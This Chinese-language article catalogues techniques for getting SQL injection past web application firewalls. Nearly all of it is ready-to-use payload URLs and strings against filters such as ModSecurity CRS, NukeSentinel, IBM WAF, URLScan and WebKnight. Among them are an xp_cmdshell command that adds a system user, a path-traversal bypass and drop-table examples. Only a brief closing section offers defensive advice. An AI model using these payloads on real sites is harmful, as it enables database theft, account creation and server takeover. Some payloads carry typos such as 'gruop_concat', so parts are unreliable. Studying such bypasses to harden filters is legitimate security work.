@@ -1,0 +1,386 @@
+绕过WAF的SQL注入语句
+
+0x00前言
+现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于手工进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。
+
+0x01 确认WAF
+首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为当我们使用恶意的注入语句时，往往有WAF或者安全狗提示信息，所以我们可以执行注入语句后观察页面变化的差异性。
+
+0x02 绕过功能和关键字过滤
+
+------------------------------
+过滤关键字: and, or
+
+PHP过滤代码:
+preg_match('/(and|or)/i', $id)
+过滤注入:
+1 or 1 = 1
+1 and 1 = 1
+绕过注入:
+1 || 1 = 1
+1 && 1 = 1
+------------------------------
+过滤关键字: and, or, union
+
+PHP过滤代码:
+preg_match('/(and|or|union)/i', $id)
+过滤注入:
+union select user, password from users
+绕过注入:
+1 || (select user from users where user_id = 1) = 'admin'
+------------------------------
+过滤关键字: and, or, union, where
+
+PHP过滤代码:
+preg_match('/(and|or|union|where)/i', $id)
+过滤注入:
+1 || (select user from users where user_id = 1) = 'admin'
+绕过注入:
+1 || (select user from users limit 1) = 'admin'
+------------------------------
+过滤关键字: and, or, union, where, limit
+
+PHP过滤代码:
+preg_match('/(and|or|union|where|limit)/i', $id)
+过滤注入:
+1 || (select user from users limit 1) = 'admin'
+绕过注入:
+1 || (select user from users group by user_id having user_id = 1) = 'admin'
+---------------------------------
+过滤关键字: and, or, union, where, limit, group by
+
+PHP过滤代码:
+preg_match('/(and|or|union|where|limit|group by)/i', $id)
+过滤注入:
+1 || (select user from users group by user_id having user_id = 1) = 'admin'
+绕过注入:
+1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1
+---------------------------------
+过滤关键字: and, or, union, where, limit, group by, select
+
+PHP过滤代码:
+preg_match('/(and|or|union|where|limit|group by|select)/i', $id)
+过滤注入:
+1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+绕过注入:
+1 || 1 = 1 into outfile 'result.txt'
+绕过注入:
+1 || substr(user,1,1) = 'a'
+---------------------------------
+过滤关键字: and, or, union, where, limit, group by, select, '
+
+PHP过滤代码:
+preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)
+过滤注入:
+1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+绕过注入:
+1 || user_id is not null
+绕过注入:
+1 || substr(user,1,1) = 0x61
+绕过注入:
+1 || substr(user,1,1) = unhex(61)
+---------------------------------
+过滤关键字: and, or, union, where, limit, group by, select, ', hex
+
+PHP过滤代码:
+preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)
+过滤注入:
+1 || substr(user,1,1) = unhex(61)
+绕过注入:
+1 || substr(user,1,1) = lower(conv(11,10,36))
+-----------
+过滤关键字: and, or, union, where, limit, group by, select, ', hex, substr
+
+PHP过滤代码:
+preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)
+过滤注入:
+1 || substr(user,1,1) = lower(conv(11,10,36))
+绕过注入:
+1 || lpad(user,7,1)
+---------------------------------
+过滤关键字: and, or, union, where, limit, group by, select, ', hex, substr, white space
+
+PHP过滤代码:
+preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)
+过滤注入:
+1 || lpad(user,7,1)
+绕过注入:
+1%0b||%0blpad(user,7,1)
+---------------------------------
+0x03 绕过表达式匹配
+PHPIDS 能够阻挡一些字符注入，例如 1 or 1=1, 1 or '1', 1 or char(97)，
+但是我们只要不使用这些字符，使用另外的字符便可以进行绕过
+过滤注入:
+          1 or 1 = 1
+绕过注入:
+          1 or 1
+---------------------------------
+过滤注入:
+1 union select 1, table_name from information_schema.tables where table_name = 'users'
+过滤注入:
+1 union select 1, table_name from information_schema.tables where table_name between 'a' and 'z'
+过滤注入:
+1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)
+
+绕过注入:
+1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a
+绕过注入:
+1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273
+---------------------------------
+0x04 常规绕过
+
+1. 注释拼接
+http://victim.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3--
+---------------------------------
+2. 改变关键字大小写，混输
+正则过滤: /union\sselect/g
+http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--
+---------------------------------
+3. 替换关键字
+
+http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--
+
+http://victim.com/news.php?id=1+uni%0bon+se%0blect+1,2,3--
+
+对于Mod_rewrite，注释"/**/"不能绕过，所以我们用"%0b"替换"/**/"
+禁止: http://victim.com/main/news/id/1/**/||/**/lpad(first_name,7,1).html
+绕过: http://victim.com/main/news/id/1%0b||%0blpad(first_name,7,1).html
+---------------------------------
+4. 字符编码
+http://victim.com/news.php?id=1%252f%252a*/union%252f%252a/select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users-
+
+此外，这些技术可以结合起来绕过Citrix Netscaler负载均衡器
+- 删除所有"NULL"字符
+- 在某些部分使用查询编码
+- 删除单引号字符"'"
+---------------------------------
+#实际使用示例:
+
+1. NukeSentinel (Nuke Evolution)
+
+[Nukesentinel.php Code]------------------------------------------------------------
+// 检查UNION攻击
+// Copyright 2004(c) Raven PHP Scripts
+$blocker_row = $blocker_array[1];
+if($blocker_row['activate'] > 0) {
+ 
+if (stristr($nsnst_const['query_string'],'+union+') OR \
+stristr($nsnst_const['query_string'],'%20union%20') OR \
+stristr($nsnst_const['query_string'],'*/union/*') OR \
+stristr($nsnst_const['query_string'],' union ') OR \
+stristr($nsnst_const['query_string_base64'],'+union+') OR \
+stristr($nsnst_const['query_string_base64'],'%20union%20') OR \
+stristr($nsnst_const['query_string_base64'],'*/union/*') OR \
+stristr($nsnst_const['query_string_base64'],' union ')) {  // block_ip($blocker_row);
+  die("BLOCK IP 1 " );  // die() 等同于 exit()
+ }
+}
+
+我们可以通过这些脚本绕过它们的过滤:
+
+禁止: http://victim.com/php-nuke/?/**/union/**/select…..
+绕过 : http://victim.com/php-nuke/?/%2A%2A/union/%2A%2A/select…
+绕过 : http://victim.com/php-nuke/?%2f**%2funion%2f**%2fselect…
+---------------------------------
+2. 国防部安全CRS（来源：Johannes Dahse）
+
+[SecRule]----
+SecRule REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* "\bunion\b.{1,100}?\bselect\b" \ "phase2,rev:'2.2.1',capture,t:none,
+t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,t:replaceComments,t:compressWhiteSpace,ctl:auditLogParts=+E,block,
+msg:'SQL Injection Attack',id:'959047',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WASCTC/WASC-19',tag:'OWASP_TOP_10/A1',
+tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5.2',logdata:'%{TX.0}',severity:'2',setvar:'tx.msg=%{rule.msg}',
+setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},
+setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}"
+
+我们可以用这段代码绕过他们的过滤:
+http://victim.com/news.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+----------
+3  MySQL Server支持3种注释样式：
+- 从"#"字符到行尾
+- 从"-"序列到行尾
+- 从一个/* */序列，如C编程语言。
+  这种语法使得注释可以扩展到多行，因为开始和结束序列不需要在同一行上。
+---------------------------------
+以下示例中，我们使用"%0D%0A"作为新的换行字符,我们来看看第一个请求（提取数据库用户）
+生成的SQL payload看起来像这样：
+0 div 1 union#foo*/*/bar
+select#foo
+1,2,current_user
+
+但是，当SQL数据库执行时，SQL payload看起来像这样：
+0 div 1 union select 1,2, current_user
+---------------------------------
+4. 缓冲区溢出
+当载入大量数据时，用C语言编写的文件可能会溢出或执行不同的操作
+给大量的数据允许我们的代码执行
+---------------------------------
+[Code]
+http://victim.com/news.php?id=1+and+(select 1)=(select 0x414141414141441414141414114141414141414141414141414141
+414141414141….)+union+select+1,2,version(),database(),user(),6,7,8,9,10--
+---------------------------------
+ 5. 内联注释（仅限Mysql）
+从MySQL 5.0参考手册，MySQL Server支持一些C风格的注释变体,
+这些使您能够写包含MySQL扩展名，但仍可移植的代码，使用以下表单的注释：
+
+/*! MySQL专用代码 */
+
+在这种情况下，MySQL服务器解析并执行注释中的代码，就像其他SQL语句一样，
+但其他SQL服务器将忽略扩展。
+
+很多WAF过滤SQL关键字，如/union\sselect\ig我们可以通过使用内联注释来绕过此过滤器。
+http://victim.com/news.php?id=1/*!UnIoN*/SeLecT+1,2,3--
+
+可以在整个SQL语句中使用内联注释，以便如果table_name或information_schema被过滤，我们可以
+添加更多内联注释
+http://victim.com/news.php?id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables
+/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--
+---------------------------------
+0x05 高级绕过
+1 HTTP参数污染
+HTTP参数污染 (示例)
++------------------------------------------------------------------+
+| Web Server  | Parameter Interpretation
+| Example
+  |
++------------------------------------------------------------------+
+| ASP.NET/IIS | 用逗号连接        | par1=val1,val2  |
+| ASP/IIS     | 用逗号连接        | par1=val1,val2  |
+| PHP/Apache  | 最后一个参数是结果| par1=val2       |
+| JSP/Tomcat  | 第一个参数是结果  | par1=val1       |
+| Perl/Apache | 第一个参数是结果  | par1=val1       |
+| DBMan       | 用两个波浪号连接  | par1=val1~~val2 |
++------------------------------------------------------------------+
+#实际使用示例:
+ 1. 国防部安全CRS（来源：Lavakumar Kuppan）
+
+以下请求与作为SQL注入攻击的ModSecurity CRS进行匹配并被阻止。
+
+禁止: http://victim.com/search.aspx?q=select name,password from users
+
+当相同的有效负载与同名的多个参数分离时，ModSecurity无法阻止它。
+绕过 : http://victim.com/search.aspx?q=select name&q=password from users
+
+Let's see what's happen, ModSecurity's interpretation is
+
+q=select name
+q=password from users
+
+ASP/ASP.NET's 的解释是
+q=select name,password from users
+
+
+*提示：可以以类似的方式在POST变量上执行此攻击
+---------------------------------
+2. 商业WAF
+
+禁止: http://victim.com/search.aspx?q=select name,password from users
+现在我们使用HPP + Inline注释绕过它。
+绕过 : http://victim.com/search.aspx?q=select/*&q=*/name&q=password/*&q=*/from/*&q=*/users
+
+分析，WAF的解释是：
+
+q=select/*
+q=*/name
+q=password/*
+q=*/from/*
+q=*/users
+
+ASP/ASP.NET's的解释是
+q=select/*,*/name,password/*,*/from/*,*/users
+q=select name,password from users
+---------------------------------
+3. IBM Web应用程序防火墙 (来源: Wendel Guglielmetti Henrique of Trustwave's SpiderLabs)
+
+禁止: http://victim.com/news.aspx?id=1'; EXEC master..xp_cmdshell “net user zeq3ul UrWaFisShiT /add” --
+现在我们使用HPP + Inline注释绕过它。
+绕过 : http://victim.com/news.aspx?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell /*&id=1*/ “net user lucifer UrWaFisShiT” /*&id=1*/ --
+
+分析，WAF的解释是
+id=1’; /*
+id=1*/ EXEC /*
+id=1*/ master..xp_cmdshell /*
+id=1*/ “net user zeq3ul UrWaFisShiT” /*
+id=1*/ --
+
+ASP/ASP.NET's的解释是
+id=1’; /*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ “net user zeq3ul UrWaFisShiT” /*,1*/ --
+id=1’; EXEC master..xp_cmdshell “net user zeq3ul UrWaFisShiT” --
+---------------------------------
+HTTP参数包含
+HTTP参数污染（HPC）的原始想法来自于HPP研究中发现的创新方法，通过探索Web服务器组件，Web应用程序和浏览器中的更深层次和利用奇怪的行为，这些行为是由于保留或非预期字符的查询字符串参数污染造成的。
+
+Some facts:
+     
+- 术语“查询字符串”通常用于指代"?"之间的部分 和URI的结尾
+- 如RFC 3986所定义，它是一系列字段值对
+- 对由“＆”或“;”分隔
+- RFC 2396定义了两类字符：
+未保留: a-z, A-Z, 0-9 and _ . ! ~ * ' ()
+保留  : ; / ? : @ & = + $ ,
+非预期: { } | \ ^ [ ] ` 
+
+不同的web服务器对于处理特殊的创建请求有不同的逻辑。
+还有更多的web服务器、后端平台和特殊的字符组合，但是这次我们将在这里停止。
+
+查询字符串和Web服务器响应(示例)
++-----------------------------------------------------------+
+| Query String  |    Web Servers response / GET values      |
++-----------------------------------------------------------+
+|               | Apache/2.2.16, PHP/5.3.3   | IIS6/ASP     |
++-----------------------------------------------------------+
+| ?test[1=2     | test_1=2                   | test[1=2     |
+| ?test=%       | test=%                     | test=        |
+| ?test%00=1    | test=1                     | test=1       |
+| ?test=1%001   | NULL                       | test=1       |
+| ?test+d=1+2   | test_d=1 2                 | test d=1 2   |
++-----------------------------------------------------------+
+
+字符 "%" 影响到 ASP/ASP.NET
+
++--------------------------------------------------------------------+
+| Keywords           |           WAF      |  ASP/ASP.NET     |
++--------------------------------------------------------------------+
+| sele%ct * fr%om..  | sele%ct * fr%om..  | select * from..  |
+| ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx  | ;drop table xxx  |
+| <scr%ipt>          | <scr%ipt>          | <script>         |
+| <if%rame>          | <if%rame>          | <iframe>         |
++--------------------------------------------------------------------+
+
+#实际使用示例:
+
+1. 绕过Mod_Security SQL注入规则 (modsecurity_crs_41_sql_injection_attacks.conf) 
+[过滤]------------
+[Sun Jun 12 12:30:16 2011] [error] [client 192.168.2.102] 
+ModSecurity: Access denied with code 403 (phase 2). 
+Pattern match "\\bsys\\.user_objects\\b" at ARGS_NAMES:sys.user_objects. 
+[file "/etc/apache2/conf.d/crs/activated_rules/modsecurity_crs_41_sql_injection_attacks.conf"] [line "110"] [id "959519"] 
+[rev "2.2.0"] [msg "Blind SQL Injection Attack"] [data "sys.user_objects"] [severity "CRITICAL"] [tag "WEB_ATTACK/SQL_INJECTION"] [tag "WASCTC/WASC-19"] 
+[tag "OWASP_TOP_10/A1"] [tag "OWASP_AppSensor/CIE1"] [tag "PCI/6.5.2"] [hostname "localhost"] [uri "/"] [unique_id "TfT3gH8AAQEAAAPyLQQAAAAA"]
+
+
+禁止: http://localhost/?xp_cmdshell
+绕过 : http://localhost/?xp[cmdshell
+---------------------------------
+2. 绕过URLScan 3.1 DenyQueryStringSequences规则
+
+禁止: http://localhost/test.asp?file=../bla.txt
+绕过 : http://localhost/test.asp?file=.%./bla.txt
+---------------------------------
+3. 绕过 AQTRONIX Webknight (用于IIS和asp/asp.Net的WAF)
+禁止: http://victim.com/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables)
+绕过 : http://victim.com/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
+ 
+从这种情况来看，当我们使用"HTTP污染"时，Webknight使用SQL关键字过滤，
+在SQL关键字中插入"%"，WAF被绕过并将这些命令发送到Web服务器：
+"id=10 and 1=0/(select top 1 table_name from information_schema.tables)"，因为"%"是Web服务器中的分隔符。
+---------------------------------
+0x06 如何保护自己的网站
+执行软件生命周期(SDLC)
+安全编码：验证所有输入输出
+上线前的渗透测试
+加固由渗透发现的问题
+再次渗透测试
+部署WAF（可选）
+保持检查WAF补丁
+#WAF并不是必选的，毕竟它是有一定限制的，同时它也不能使Web 应用远离所有可能的漏洞，
+并且很有必要调整WAF过滤器以符合待保护的Web应用。WAF并不能消除漏洞，它仅仅是挡住了一部分攻击向量。
